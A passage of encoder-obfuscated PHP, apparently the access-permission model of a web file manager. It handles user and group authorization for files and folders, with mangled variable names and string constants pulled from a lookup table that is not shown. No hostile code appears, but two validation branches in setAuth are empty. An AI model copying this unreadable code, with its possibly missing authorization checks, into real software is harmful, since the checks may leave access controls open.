($ÓŠ¦ÇÈÊ[$åìì¥ŒÍ[190]] == SourceModel::TYPE_USER && $ÓŠ¦ÇÈÊ[$åìì¥ŒÍ[569]] == $åìì¥ŒÍ[228]) { $‡ÑÜè¥¿ = 0; } $ÖËÕ±Øğ[] = $ †àïîß[$åìì¥ŒÍ[487]] + $‡ÑÜè¥¿; } array_multisort($ÖËÕ±Øğ, SORT_DESC, $Åüüç«¤); return $Åüüç«¤; } public function sourceAuthSelect($°¬» ÷å) { $‡Ï­×ÃÔ =& $_SERVER[Ş­ğŠìÒ]; static $Àô³¤Á€ = array(); $¸İßîš¼ = is_array($°¬» ÷å) ? !1 : !0; if ($¸İßîš¼) { $°¬» ÷å = array($°¬» ÷å); } $÷¤÷øˆÍ = array(); foreach ($°¬» ÷å as $½–­×èÂ) { if (isset($Àô³¤Á€[$½–­×èÂ])) { $÷¤÷øˆÍ[$½–­×èÂ] = $Àô³¤Á€[$½–­×èÂ]; } } if (count($÷¤÷øˆÍ) == count($°¬» ÷å)) { return $¸İßîš¼ ? $÷¤÷øˆÍ[$°¬» ÷å[0]] : $÷¤÷øˆÍ; } $²è´°…» = $‡Ï­×ÃÔ[2149]; $“£¯ç»¸ = array($‡Ï­×ÃÔ[193] => array($‡Ï­×ÃÔ[7], $°¬» ÷å)); $¹½¼¾¸Ã = $this->field($²è´°…»)->order($‡Ï­×ÃÔ[475])->where($“£¯ç»¸)->select(); $ä£õŒªü = array_to_keyvalue_group($¹½¼¾¸Ã, $‡Ï­×ÃÔ[193]); foreach ($°¬» ÷å as $½–­×èÂ) { $Àô³¤Á€[$½–­×èÂ] = $ä£õŒªü[$½–­×èÂ] ? $ä£õŒªü[$½–­×èÂ] : array(); } if ($¸İßîš¼) { return $¹½¼¾¸Ã; } return $ä£õŒªü; } public function setAuth($‡ùèù’ï, $Ü…© é†) { $…¤øÅÎ =& $_SERVER[Ş­ğŠìÒ]; $œÀÂƒû = Model($…¤øÅÎ[1414])->sourceInfo($‡ùèù’ï); if (!$œÀÂƒû) { return !1; } if ($œÀÂƒû[$…¤øÅÎ[190]] != SourceModel::TYPE_GROUP) { return !1; } $‰¼¯üôò = 1; $ş“ì»³§ = $œÀÂƒû[$…¤øÅÎ[569]]; if ($ş“ì»³§ != $‰¼¯üôò) { $¦ã¡ÍÀŞ = array($…¤øÅÎ[1963] => $ş“ì»³§); $§®ÛØ¸û = Model($…¤øÅÎ[2058])->field($…¤øÅÎ[1764])->where($¦ã¡ÍÀŞ)->select(); $§®ÛØ¸û = array_to_keyvalue($§®ÛØ¸û, $…¤øÅÎ[12], $…¤øÅÎ[1764]); } $ØîØæ§Ñ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ªœ‘ÖŠë = array(); foreach ($Ü…© é† as $ ±úôšÃ) { if (!in_array($ ±úôšÃ[$…¤øÅÎ[190]], $ØîØæ§Ñ)) { show_json(LNG($…¤øÅÎ[2150]), !1); } if ($ş“ì»³§ != $‰¼¯üôò) { if ($ ±úôšÃ[$…¤øÅÎ[190]] == SourceModel::TYPE_GROUP) { } if ($ ±úôšÃ[$…¤øÅÎ[569]] != 0 && !in_array($ ±úôšÃ[$…¤øÅÎ[569]], $§®ÛØ¸û)) { } } if ($ ±úôšÃ[$…¤øÅÎ[569]] == 0) { $ ±úôšÃ[$…¤øÅÎ[190]] = SourceModel::TYPE_USER; } $ªœ‘ÖŠë[] = array($…¤øÅÎ[193] => $‡ùèù’ï, $…¤øÅÎ[190] => intval($ ±úôšÃ[$…¤øÅÎ[190]]), $…¤øÅÎ[569] => intval($ ±úôšÃ[$…¤øÅÎ[569]]), $…¤øÅÎ[2072] => intval($ ±úôšÃ[$…¤øÅÎ[2072]]) ? intval($ ±úôšÃ[$…¤øÅÎ[2072]]) : 0, $…¤øÅÎ[2132] => intval($ ±úôšÃ[$…¤øÅÎ[2132]]) ? intval($ ±úôšÃ[$…¤øÅÎ[2132]]) : -1); } $this->where(array($…¤øÅÎ[491] => $‡ùèù’ï))->delete(); $this->addAll($ªœ‘ÖŠë); return !0; } public function authClear($÷ìÔíïÒ) { $ÇÆõ±Ğ =& $_SERVER[Ş­ğŠìÒ]; $Ç×ş½¨´ = Model($ÇÆõ±Ğ[1414])->sourceInfo($÷ìÔíïÒ); $ĞŠ¿Ò²Ú = array($÷ìÔíïÒ); if ($Ç×ş½¨´[$ÇÆõ±Ğ[485]] == $ÇÆõ±Ğ[91]) { $Ñö›õıÎ = array($ÇÆõ±Ğ[652] => array($ÇÆõ±Ğ[612], $Ç×ş½¨´[$ÇÆõ±Ğ[584]] . $÷ìÔíïÒ . $ÇÆõ±Ğ[613])); $ĞŠ¿Ò²Ú = Model($ÇÆõ±Ğ[1414])->field($ÇÆõ±Ğ[491])->where($Ñö›õıÎ)->getField($ÇÆõ±Ğ[193], !0); $ĞŠ¿Ò²Ú[] = $÷ìÔíïÒ; } $this->where(array($ÇÆõ±Ğ[491] => array($ÇÆõ±Ğ[492], $ĞŠ¿Ò²Ú)))->delete(); return !0; } public function getAllChildren($ÒÒÜÅ×¤) { $ï®ğñîÛ =& $_SERVER[Ş­ğŠìÒ]; $ìù€÷š = Model($ï®ğñîÛ[1414])->sourceInfo($ÒÒÜÅ×¤); if ($ìù€÷š[$ï®ğñîÛ[485]] != $ï®ğñîÛ[91]) { return $this->sourceListAuth(array($ÒÒÜÅ×¤)); } if ($ìù€÷š[$ï®ğñîÛ[190]] != SourceModel::TYPE_GROUP) { return array(); } $ä€´–µ = 1; $ã²Š‰ÏÑ = array($ÒÒÜÅ×¤); if ($ìù€÷š[$ï®ğñîÛ[192]] == $ï®ğñîÛ[228] && $ìù€÷š[$ï®ğñîÛ[569]] != $ä€´–µ) { $ã²Š‰ÏÑ = $this->groupChidldAllRootSource($ìù€÷š[$ï®ğñîÛ[569]]); } $ÖòóÚÖ… = $this->field($ï®ğñîÛ[193])->group($ï®ğñîÛ[193])->select(); $ÖòóÚÖ… = array_to_keyvalue($ÖòóÚÖ…, $ï®ğñîÛ[12], $ï®ğñîÛ[193]); if (!$ÖòóÚÖ…) { return array(); } $ÄÄìŠĞŠ = $ï®ğñîÛ[2151]; $œªô„»‚ = array($ï®ğñîÛ[193] => array($ï®ğñîÛ[7], $ÖòóÚÖ…), $ï®ğñîÛ[505] => $ï®ğñîÛ[228]); $ğû…éö« = Model($ï®ğñîÛ[891])->field($ÄÄìŠĞŠ)->where($œªô„»‚)->select(); $İˆ¸ëÊî = array($ÒÒÜÅ×¤); foreach ($ğû…éö« as $ÉÆÜ£Â) { foreach ($ã²Š‰ÏÑ as $š—¦ó·€) { $¹³™ÜÕÉ = $ï®ğñîÛ[50] . $š—¦ó·€ . $ï®ğñîÛ[50]; $Ñá­¹§ = $ÉÆÜ£Â[$ï®ğñîÛ[584]] . $ÉÆÜ£Â[$ï®ğñîÛ[193]] . $ï®ğñîÛ[50]; if (strstr($Ñá­¹§, $¹³™ÜÕÉ)) { $İˆ¸ëÊî[] = $ÉÆÜ£Â[$ï®ğñîÛ[193]]; break; } } } return $this->sourceListAuth($İˆ¸ëÊî); } private function sourceListAuth($Ğ…óŸòí) { $¾ß—äŠÌ =& $_SERVER[Ş­ğŠìÒ]; $°À©Ö¼İ = Model($¾ß—äŠÌ[1414])->sourceListInfo($Ğ…óŸòí, !0); $¬â«İÎ™ = $this->sourceAuthSelect($Ğ…óŸòí); $—­°¶Ù = array(); $›Úû„¿™ = array(); foreach ($°À©Ö¼İ as $±Êà€äÚ) { unset($±Êà€äÚ[$¾ß—äŠÌ[529]]); unset($±Êà€äÚ[$¾ß—äŠÌ[527]]); unset($±Êà€äÚ[$¾ß—äŠÌ[487]]); unset($±Êà€äÚ[$¾ß—äŠÌ[90]]); $ù—»Ùï = $¬â«İÎ™[$±Êà€äÚ[$¾ß—äŠÌ[193]]]; if (!$ù—»Ùï) { continue; } $±Êà€äÚ[$¾ß—äŠÌ[2152]] = $this->authTargetInfo($ù—»Ùï); $±Êà€äÚ[$¾ß—äŠÌ[582]] = rtrim($±Êà€äÚ[$¾ß—äŠÌ[588]], $¾ß—äŠÌ[8]) . $¾ß—äŠÌ[8] . ltrim($±Êà€äÚ[$¾ß—äŠÌ[582]], $¾ß—äŠÌ[8]); $—­°¶Ù[] = $±Êà€äÚ; $£¼Å×ß² = count(explode($¾ß—äŠÌ[8], trim($±Êà€äÚ[$¾ß—äŠÌ[582]], $¾ß—äŠÌ[8]))); $›Úû„¿™[] = $£¼Å×ß² + ($±Êà€äÚ[$¾ß—äŠÌ[33]] == $¾ß—äŠÌ[78] ? 0 : 1000); } array_multisort($›Úû„¿™, SORT_ASC, $—­°¶Ù); return $—­°¶Ù; } private function groupChidldAllRootSource($î²ˆ¦ß) { $ÏêÖ•º¯ =& $_SERVER[Ş­ğŠìÒ]; $ÑóÒğÉ = Model($ÏêÖ•º¯[2153])->groupChildrenAll($î²ˆ¦ß); $–€±ù£ƒ = array($ÏêÖ•º¯[192] => 0, $ÏêÖ•º¯[569] => array($ÏêÖ•º¯[7], $ÑóÒğÉ), $ÏêÖ•º¯[190] => SourceModel::TYPE_GROUP); $Å“óôÈ = Model($ÏêÖ•º¯[891])->field($ÏêÖ•º¯[193])->where($–€±ù£ƒ)->select(); $Å“óôÈ = array_to_keyvalue($Å“óôÈ, $ÏêÖ•º¯[12], $ÏêÖ•º¯[193]); return $Å“óôÈ; } private function authTargetInfo($³øÔ›Û) { $Ã¦ÑÎßÁ =& $_SERVER[Ş­ğŠìÒ]; $ßïĞğà = array(); $¬İ” ÕÃ = array(); $’‹ğ¥ßÁ = 2 << 25; foreach ($³øÔ›Û as $‡©ØÀ÷í) { $“ÒÁéÃÜ = Model($Ã¦ÑÎßÁ[571])->listData($‡©ØÀ÷í[$Ã¦ÑÎßÁ[2072]]); if (!$“ÒÁéÃÜ) { continue; } if ($‡©ØÀ÷í[$Ã¦ÑÎßÁ[190]] == SourceModel::TYPE_USER) { $‚ñ­ñüŞ = Model($Ã¦ÑÎßÁ[577])->getInfoSimpleOuter($‡©ØÀ÷í[$Ã¦ÑÎßÁ[569]]); if ($‚ñ­ñüŞ[$Ã¦ÑÎßÁ[1764]] == $Ã¦ÑÎßÁ[1269]) { continue; } if ($‚ñ­ñüŞ[$Ã¦ÑÎßÁ[1764]] == $Ã¦ÑÎßÁ[228]) { $‚ñ­ñüŞ[$Ã¦ÑÎßÁ[32]] = LNG($Ã¦ÑÎßÁ[2154]); } } else { $‚ñ­ñüŞ = Model($Ã¦ÑÎßÁ[585])->getInfoSimple($‡©ØÀ÷í[$Ã¦ÑÎßÁ[569]]); } if (!$‚ñ­ñüŞ) { continue; } $‚ñ­ñüŞ[$Ã¦ÑÎßÁ[540]] = $“ÒÁéÃÜ; $ßïĞğà[] = $‚ñ­ñüŞ; $£ıÖïë = 0; if ($‡©ØÀ÷í[$Ã¦ÑÎßÁ[190]] == SourceModel::TYPE_GROUP) { $£ıÖïë = $’‹ğ¥ßÁ * 2; } if ($‡©ØÀ÷í[$Ã¦ÑÎßÁ[190]] == SourceModel::TYPE_USER) { $£ıÖïë = $’‹ğ¥ßÁ; } if ($‡©ØÀ÷í[$Ã¦ÑÎßÁ[190]] == SourceModel::TYPE_USER && $‡©ØÀ÷í[$Ã¦ÑÎßÁ[569]] == $Ã¦ÑÎßÁ[228]) { $£ıÖïë = 0; } $¬İ” ÕÃ[] = $“ÒÁéÃÜ[$Ã¦ÑÎßÁ[487]] + $£ıÖïë; } array_multisort($¬İ” ÕÃ, SORT_DESC, $ßïĞğà); return $ßïĞğà; } public function getAllChildrenByUser($ÆÅÚšó, $À‹ç¸ñß) { $Ó¹ ÅÌÔ =& $_SERVER[Ş­ğŠìÒ]; $éÓàèçå = Model($Ó¹ ÅÌÔ[598])->getInfo($À‹ç¸ñß); if (!$À‹ç¸ñß || !$ÆÅÚšó || !$éÓàèçå) { return array(); } $×¯Ÿ€éœ = Model($Ó¹ ÅÌÔ[1414])->sourceInfo($ÆÅÚšó); $°„ÏÔ˜³ = array(); $Û¨†‰³° = 1; if ($×¯Ÿ€éœ[$Ó¹ ÅÌÔ[192]] == $Ó¹ ÅÌÔ[228] && $×¯Ÿ€éœ[$Ó¹ ÅÌÔ[569]] != $Û¨†‰³° && $this->groupContainUser($×¯Ÿ€éœ[$Ó¹ ÅÌÔ[569]], $À‹ç¸ñß)) { foreach ($éÓàèçå[$Ó¹ ÅÌÔ[2155]] as $ø¿¬¯¶ˆ) { $ÈÄ¾âÕ¾ = Model($Ó¹ ÅÌÔ[585])->getInfo($ø¿¬¯¶ˆ[$Ó¹ ÅÌÔ[1963]]); $½€²Èö× = Model($Ó¹ ÅÌÔ[598])->getInfoSimpleOuter($À‹ç¸ñß); $½€²Èö×[$Ó¹ ÅÌÔ[540]] = $ø¿¬¯¶ˆ[$Ó¹ ÅÌÔ[487]]; if (Model($Ó¹ ÅÌÔ[571])->authCheckAction($ø¿¬¯¶ˆ[$Ó¹ ÅÌÔ[487]][$Ó¹ ÅÌÔ[487]], $Ó¹ ÅÌÔ[1984])) { continue; } $½ğœ§ë = array($Ó¹ ÅÌÔ[32] => $Ó¹ ÅÌÔ[1289] . $ÈÄ¾âÕ¾[$Ó¹ ÅÌÔ[32]], $Ó¹ ÅÌÔ[193] => $ÈÄ¾âÕ¾[$Ó¹ ÅÌÔ[90]][$Ó¹ ÅÌÔ[193]], $Ó¹ ÅÌÔ[87] => KodIO::make($ÈÄ¾âÕ¾[$Ó¹ ÅÌÔ[90]][$Ó¹ ÅÌÔ[193]]), $Ó¹ ÅÌÔ[192] => $Ó¹ ÅÌÔ[228], $Ó¹ ÅÌÔ[190] => $Ó¹ ÅÌÔ[578], $Ó¹ ÅÌÔ[33] => $Ó¹ ÅÌÔ[616], $Ó¹ ÅÌÔ[582] => $ÈÄ¾âÕ¾[$Ó¹ ÅÌÔ[589]], $Ó¹ ÅÌÔ[1963] => $ÈÄ¾âÕ¾[$Ó¹ ÅÌÔ[1963]], $Ó¹ ÅÌÔ[586] => $ÈÄ¾âÕ¾[$Ó¹ ÅÌÔ[192]], $Ó¹ ÅÌÔ[2152] => array($½€²Èö×)); $°„ÏÔ˜³[$½ğœ§ë[$Ó¹ ÅÌÔ[193]]] = $½ğœ§ë; } } $”úÁíÊÈ = array(); $ı¬û‘Ü¨ = $this->getAllChildren($ÆÅÚšó); foreach ($ı¬û‘Ü¨ as $õ¿¸¼Í„) { $ˆˆöà± = !1; foreach ($õ¿¸¼Í„[$Ó¹ ÅÌÔ[2152]] as $Å£çö™Û) { if ($Å£çö™Û[$Ó¹ ÅÌÔ[1764]]) { if ($Å£çö™Û[$Ó¹ ÅÌÔ[1764]] == $À‹ç¸ñß) { $ˆˆöà± = !0; break; } } if ($Å£çö™Û[$Ó¹ ÅÌÔ[1963]]) { if ($this->groupContainUser($Å£çö™Û[$Ó¹ ÅÌÔ[1963]], $À‹ç¸ñß)) { $ˆˆöà± = !0; break; } } } if ($ˆˆöà±) { $”úÁíÊÈ[] = $õ¿¸¼Í„; } $æÅ½…êÜ = $õ¿¸¼Í„[$Ó¹ ÅÌÔ[193]]; if (isset($°„ÏÔ˜³[$æÅ½…êÜ])) { $õ¿¸¼Í„[$Ó¹ ÅÌÔ[2152]][] = $°„ÏÔ˜³[$æÅ½…êÜ][0]; $°„ÏÔ˜³[$æÅ½…êÜ] = !1; } } $°„ÏÔ˜³ = array_filter(array_values($°„ÏÔ˜³)); $”úÁíÊÈ = array_merge($°„ÏÔ˜³, $”úÁíÊÈ); return $”úÁíÊÈ; } public function setAllChildrenByUser($‘Öú‡è«, $®®Ş¦, $ØºÀº™à) { $ÁÜÍù¼® =& $_SERVER[Ş­ğŠìÒ]; $ØÉı¶‰ = $this->getAllChildrenByUser($‘Öú‡è«, $®®Ş¦); if (!$ØºÀº™à || !$ØÉı¶‰) { return !1; } foreach ($ØÉı¶‰ as $ğ†–£ï) { $âè¸ËÂ¦ = array(); foreach ($ğ†–£ï[$ÁÜÍù¼®[2152]] as $ÕÛ­İİ¼) { $›ëøÃ·¤ = $ÕÛ­İİ¼[$ÁÜÍù¼®[540]]; $›ëùòÉç = $ÕÛ­İİ¼[$ÁÜÍù¼®[1764]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $¯õûÉÉæ = $ÕÛ­İİ¼[$ÁÜÍù¼®[1764]] ? $ÕÛ­İİ¼[$ÁÜÍù¼®[1764]] : $ÕÛ­İİ¼[$ÁÜÍù¼®[1963]]; if ($ÕÛ­İİ¼[$ÁÜÍù¼®[1764]] && $ÕÛ­İİ¼[$ÁÜÍù¼®[1764]] == $®®Ş¦) { continue; } $âè¸ËÂ¦[] = array($ÁÜÍù¼®[193] => $ğ†–£ï[$ÁÜÍù¼®[193]], $ÁÜÍù¼®[190] => $›ëùòÉç, $ÁÜÍù¼®[569] => intval($¯õûÉÉæ), $ÁÜÍù¼®[2072] => isset($›ëøÃ·¤[$ÁÜÍù¼®[475]]) ? intval($›ëøÃ·¤[$ÁÜÍù¼®[475]]) : 0, $ÁÜÍù¼®[2132] => isset($›ëøÃ·¤[$ÁÜÍù¼®[2132]]) ? intval($›ëøÃ·¤[$ÁÜÍù¼®[2132]]) : -1); } $âè¸ËÂ¦[] = array($ÁÜÍù¼®[193] => $ğ†–£ï[$ÁÜÍù¼®[193]], $ÁÜÍù¼®[190] => SourceModel::TYPE_USER, $ÁÜÍù¼®[569] => intval($®®Ş¦), $ÁÜÍù¼®[2072] => intval($ØºÀº™à), $ÁÜÍù¼®[2132] => -1); $this->where(array($ÁÜÍù¼®[491] => $ğ†–£ï[$ÁÜÍù¼®[193]]))->delete(); $this->addAll($âè¸ËÂ¦); } return !0; } public function get($ÓÏÌÓ³) { $­¸Å×”ç = $this->getSourceList(array($ÓÏÌÓ³), !0); return $­¸Å×”ç[0]; } public function getSourceList($èùÓ¢, $ú øÚ°ˆ = false, $€®¬ Ë¸ = false) { $…ë“Ä·¾ =& $_SERVER[Ş­ğŠìÒ]; if (!$èùÓ¢) { return array(); } $¿ƒªÂë¤ = Model($…ë“Ä·¾[1414]); if (!$ú øÚ°ˆ && count($èùÓ¢) == 1) { $ú øÚ°ˆ = array(); $ú øÚ°ˆ[$èùÓ¢[0]] = $¿ƒªÂë¤->sourceInfo($èùÓ¢[0]); } if (!$ú øÚ°ˆ) { $şŒü›‰‹ = array($…ë“Ä·¾[491] => array($…ë“Ä·¾[492], $èùÓ¢)); $ú øÚ°ˆ = $¿ƒªÂë¤->field($…ë“Ä·¾[2156])->where($şŒü›‰‹)->select(); $ú øÚ°ˆ = array_to_keyvalue($ú øÚ°ˆ, $…ë“Ä·¾[193]); } $¥ÁÔ£ = $èùÓ¢; foreach ($ú øÚ°ˆ as $’èç¿ˆ => $¹©ÉşåÌ) { $×±ı ÃÂ = $¿ƒªÂë¤->parentLevelArray($¹©ÉşåÌ[$…ë“Ä·¾[584]]); $¥ÁÔ£ = array_merge($¥ÁÔ£, array($’èç¿ˆ), array_reverse($×±ı ÃÂ)); } $¥ÁÔ£ = array_values(array_unique($¥ÁÔ£)); if (!$¥ÁÔ£) { return array(); } $¼íÑ‘‰« = $this->sourceAuthSelect($¥ÁÔ£); $û§è•± = array(); foreach ($¥ÁÔ£ as $ˆƒŸæ‡¹) { if (isset($¼íÑ‘‰«[$ˆƒŸæ‡¹])) { $û§è•±[$ˆƒŸæ‡¹] = $¼íÑ‘‰«[$ˆƒŸæ‡¹]; } } $Å”ß†½ = $this->userIsRoot($€®¬ Ë¸); $õƒ˜¶àÃ = AuthModel::authAll(); $©¥úáòÍ = array($…ë“Ä·¾[488] => $õƒ˜¶àÃ, $…ë“Ä·¾[2157] => array($…ë“Ä·¾[493] => 0, $…ë“Ä·¾[1969] => $õƒ˜¶àÃ, $…ë“Ä·¾[494] => LNG($…ë“Ä·¾[2158]), $…ë“Ä·¾[1986] => $…ë“Ä·¾[2159])); $şÄÎŒ¶ = array(); foreach ($ú øÚ°ˆ as $ˆƒŸæ‡¹ => $èÆÜ•­ó) { if ($Å”ß†½ && $GLOBALS[$…ë“Ä·¾[6]][$…ë“Ä·¾[1982]]) { $şÄÎŒ¶[$ˆƒŸæ‡¹] = $©¥úáòÍ; continue; } $şÄÎŒ¶[$ˆƒŸæ‡¹] = $this->makeSourceAuth($èÆÜ•­ó, $û§è•±, $€®¬ Ë¸); } return $şÄÎŒ¶; } public function authDeepCheck($úû¨©Û, $±Ğ¬ºõâ = false) { $ÒèØÅÆ½ =& $_SERVER[Ş­ğŠìÒ]; $±Ğ¬ºõâ = $±Ğ¬ºõâ ? $±Ğ¬ºõâ : USER_ID; $‡Ô¼¤Å = $this->makeAuthDeep($±Ğ¬ºõâ); if (!in_array($úû¨©Û, $‡Ô¼¤Å[$ÒèØÅÆ½[2160]])) { return !1; } $Ÿ‘›Ô”ú = array(); foreach ($‡Ô¼¤Å[$ÒèØÅÆ½[2161]] as $å¹®¯¹ª => $¬üŸÆçç) { if (!in_array($úû¨©Û, $¬üŸÆçç)) { continue; } $Ÿ‘›Ô”ú[] = $å¹®¯¹ª; } if (!$Ÿ‘›Ô”ú) { return !1; } $Ğüƒı™¯ = $Ÿ‘›Ô”ú ? $Ÿ‘›Ô”ú[0] : $úû¨©Û; return array($ÒèØÅÆ½[488] => -1, $ÒèØÅÆ½[540] => array($ÒèØÅÆ½[493] => $ÒèØÅÆ½[1269], $ÒèØÅÆ½[1969] => $ÒèØÅÆ½[228], $ÒèØÅÆ½[494] => LNG($ÒèØÅÆ½[2162]), $ÒèØÅÆ½[1986] => $ÒèØÅÆ½[2163]), $ÒèØÅÆ½[2164] => LNG($ÒèØÅÆ½[2165]), $ÒèØÅÆ½[2166] => $this->sourceAuthInfo($Ğüƒı™¯)); } protected function makeAuthDeep($ë·¢Üèé = false) { $¿ÃÒ¦ùä =& $_SERVER[Ş­ğŠìÒ]; static $†è¸ùÊ = array(); $ë·¢Üèé = $ë·¢Üèé ? $ë·¢Üèé : USER_ID; if (isset($†è¸ùÊ[$ë·¢Üèé])) { return $†è¸ùÊ[$ë·¢Üèé]; } $‰ù”«¡¦ = Model($¿ÃÒ¦ùä[2167])->listData(); $Ø‰é½Ç = array(); foreach ($‰ù”«¡¦ as $¹×²Ãñ¬) { if ($¹×²Ãñ¬[$¿ÃÒ¦ùä[487]] == 0 && $¹×²Ãñ¬[$¿ÃÒ¦ùä[1985]] == $¿ÃÒ¦ùä[91]) { $Ø‰é½Ç[] = $¹×²Ãñ¬[$¿ÃÒ¦ùä[475]]; } } $İÅø­»ì = $this->userGroupParents($ë·¢Üèé); $±ßà¥ÖŠ = array($¿ÃÒ¦ùä[190] => SourceModel::TYPE_USER, $¿ÃÒ¦ùä[569] => $ë·¢Üèé); if ($İÅø­»ì) { $±ßà¥ÖŠ = array(array($¿ÃÒ¦ùä[190] => SourceModel::TYPE_USER, $¿ÃÒ¦ùä[569] => $ë·¢Üèé), array($¿ÃÒ¦ùä[190] => SourceModel::TYPE_GROUP, $¿ÃÒ¦ùä[569] => array($¿ÃÒ¦ùä[492], $İÅø­»ì)), $¿ÃÒ¦ùä[1074] => $¿ÃÒ¦ùä[2066]); } $¯‰ˆØÎ = $this->field($¿ÃÒ¦ùä[2168])->where($±ßà¥ÖŠ)->select(); $Ğ˜®Ã¿Í = array(); $ÚÊÆÌË© = array_to_keyvalue_group($¯‰ˆØÎ, $¿ÃÒ¦ùä[193]); foreach ($ÚÊÆÌË© as $£’ŒæÓ => $’…¬÷ƒ¾) { $ê¶‚Ğ„˜ = $this->authArrayCheck($’…¬÷ƒ¾, $ë·¢Üèé); if ($ê¶‚Ğ„˜[$¿ÃÒ¦ùä[488]] > 0) { $Ğ˜®Ã¿Í[] = $£’ŒæÓ . $¿ÃÒ¦ùä[12]; } } if ($İÅø­»ì) { $¡Ø¨ÛÀÍ = Model($¿ÃÒ¦ùä[585]); foreach ($İÅø­»ì as $¼º²ª®À) { $ğÜÔ˜âŞ = $¡Ø¨ÛÀÍ->getInfo($¼º²ª®À); if (!$ğÜÔ˜âŞ || !is_array($ğÜÔ˜âŞ[$¿ÃÒ¦ùä[90]])) { continue; } $Ğ˜®Ã¿Í[] = $ğÜÔ˜âŞ[$¿ÃÒ¦ùä[90]][$¿ÃÒ¦ùä[193]]; } } $“ÏëŒÑ = array(); $¤„°Óš = $İÅø­»ì; $šİæ‘‡ = Model($¿ÃÒ¦ùä[1414]); $¡Ø¨ÛÀÍ = Model($¿ÃÒ¦ùä[585]); $ÄÔ‹ê˜‚ = array(); $¤Äó› = array(); $ŠŸĞç±« = array(); $åĞÈÍÊ = array(); if ($Ğ˜®Ã¿Í) { $®Ò¢ÚÍÖ = $šİæ‘‡->where(array($¿ÃÒ¦ùä[193] => array($¿ÃÒ¦ùä[492], $Ğ˜®Ã¿Í)))->select(); foreach ($®Ò¢ÚÍÖ as $ü‚¦ã‚å) { $Ö©ŒÑ = $šİæ‘‡->parentLevelArray($ü‚¦ã‚å[$¿ÃÒ¦ùä[584]]); $“ÏëŒÑ = array_merge($“ÏëŒÑ, $Ö©ŒÑ); $¤„°Óš[] = $ü‚¦ã‚å[$¿ÃÒ¦ùä[569]]; $ÄÔ‹ê˜‚[$ü‚¦ã‚å[$¿ÃÒ¦ùä[193]]] = $Ö©ŒÑ; $¤Äó›[$ü‚¦ã‚å[$¿ÃÒ¦ùä[193]]] = $ü‚¦ã‚å[$¿ÃÒ¦ùä[569]]; } } $¤„°Óš = array_values(array_unique($¤„°Óš)); $çºÇë = $¤„°Óš; foreach ($çºÇë as $¼º²ª®À) { $ğÜÔ˜âŞ = $¡Ø¨ÛÀÍ->getInfo($¼º²ª®À); $Ö©ŒÑ = $šİæ‘‡->parentLevelArray($ğÜÔ˜âŞ[$¿ÃÒ¦ùä[584]]); $¤„°Óš = array_merge($¤„°Óš, $Ö©ŒÑ); } $¤„°Óš = array_values(array_unique($¤„°Óš)); foreach ($¤„°Óš as $¼º²ª®À) { $ğÜÔ˜âŞ = $¡Ø¨ÛÀÍ->getInfo($¼º²ª®À); $“ÏëŒÑ[] = $ğÜÔ˜âŞ[$¿ÃÒ¦ùä[90]][$¿ÃÒ¦ùä[193]]; $ŠŸĞç±«[$¼º²ª®À] = $ğÜÔ˜âŞ[$¿ÃÒ¦ùä[90]][$¿ÃÒ¦ùä[193]]; $åĞÈÍÊ[$¼º²ª®À] = $šİæ‘‡->parentLevelArray($ğÜÔ˜âŞ[$¿ÃÒ¦ùä[584]]); } foreach ($ÄÔ‹ê˜‚ as $òä×ˆğî => $¤Âğ«ãç) { $ùâ­„“ = $¤Äó›[$òä×ˆğî]; if (!$ùâ­„“ || !$ŠŸĞç±«[$ùâ­„“]) { continue; } $öæÖºß• = array(); foreach ($åĞÈÍÊ[$ùâ­„“] as $¼º²ª®À) { $öæÖºß•[] = $ŠŸĞç±«[$¼º²ª®À]; } $ÄÔ‹ê˜‚[$òä×ˆğî] = array_merge($öæÖºß•, $¤Âğ«ãç); } $“ÏëŒÑ = array_values(array_unique($“ÏëŒÑ)); $à™Ç¹õË = array($¿ÃÒ¦ùä[2160] => $“ÏëŒÑ, $¿ÃÒ¦ùä[2161] => $ÄÔ‹ê˜‚); $†è¸ùÊ[$ë·¢Üèé] = $à™Ç¹õË; return $à™Ç¹õË; } private function makeSourceAuth($‡ìåç‘î, $à‘‡ÜÌÄ, $™¥Ùèøî = false) { $øı ‡…÷ =& $_SERVER[Ş­ğŠìÒ]; $’õÊúÈè = $øı ‡…÷[91]; $Ê‡ÀŒÂ½ = $‡ìåç‘î[$øı ‡…÷[569]]; $ñ‘ø¤·™ = $‡ìåç‘î[$øı ‡…÷[190]] == SourceModel::TYPE_GROUP; $éğÆ«Â™ = $ñ‘ø¤·™ ? $this->groupRootAuth($Ê‡ÀŒÂ½, $™¥Ùèøî) : !1; if ($éğÆ«Â™ && Model($øı ‡…÷[571])->authCheckAction($éğÆ«Â™[$øı ‡…÷[487]], $øı ‡…÷[1984])) { return $this->groupAuthInfo($éğÆ«Â™, $Ê‡ÀŒÂ½); } $ó‡è¼ÅÑ = Model($øı ‡…÷[1414])->parentLevelArray($‡ìåç‘î[$øı ‡…÷[584]]); $ó‡è¼ÅÑ = array_merge(array($‡ìåç‘î[$øı ‡…÷[193]]), array_reverse($ó‡è¼ÅÑ)); $óöíô•ó = !1; foreach ($ó‡è¼ÅÑ as $›Û‡‘–³) { if (!isset($à‘‡ÜÌÄ[$›Û‡‘–³])) { continue; } $îšÌúó” = $this->authMake($à‘‡ÜÌÄ[$›Û‡‘–³], $™¥Ùèøî); if ($îšÌúó”[$øı ‡…÷[540]]) { $óöíô•ó = $îšÌúó”; break; } } if (!$ñ‘ø¤·™) { return $óöíô•ó; } if (!$óöíô•ó && $éğÆ«Â™) { $óöíô•ó = $this->groupAuthInfo($éğÆ«Â™, $Ê‡ÀŒÂ½); } if (!$óöíô•ó) { $šã’³Ô = Model($øı ‡…÷[585])->getInfo($Ê‡ÀŒÂ½); $½š¹Ñ±¶ = explode($øı ‡…÷[50], trim($šã’³Ô[$øı ‡…÷[584]], $øı ‡…÷[50])); $½š¹Ñ±¶ = array_reverse($½š¹Ñ±¶); foreach ($½š¹Ñ±¶ as $»ç÷âè) { if ($»ç÷âè == $øı ‡…÷[228] || $»ç÷âè == $’õÊúÈè) { continue; } $ëïÑÁĞ© = $this->groupRootAuth($»ç÷âè, $™¥Ùèøî); if (!$ëïÑÁĞ©) { continue; } $óöíô•ó = $this->groupAuthInfo($ëïÑÁĞ©, $»ç÷âè); break; } } if (!$óöíô•ó || $óöíô•ó[$øı ‡…÷[488]] <= 0) { $³ùõç£‰ = $this->authDeepCheck($‡ìåç‘î[$øı ‡…÷[193]], $™¥Ùèøî); if ($³ùõç£‰) 